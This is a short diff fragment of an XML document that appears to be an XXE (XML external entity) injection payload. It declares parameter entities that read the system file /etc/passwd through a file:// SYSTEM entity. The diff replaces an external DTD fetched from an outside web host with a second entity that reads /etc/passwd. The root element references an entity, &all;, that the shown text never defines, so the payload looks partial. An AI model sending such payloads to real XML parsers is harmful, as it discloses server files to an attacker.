@@ -3,7 +3,7 @@
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % stuff SYSTEM "file:///etc/passwd">
 <!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "http://www.baidu.com">
-%dtd;
+<!ENTITY % abc SYSTEM "file:///etc/passwd">
+%abc;
 ]>
 <root>&all;</root>
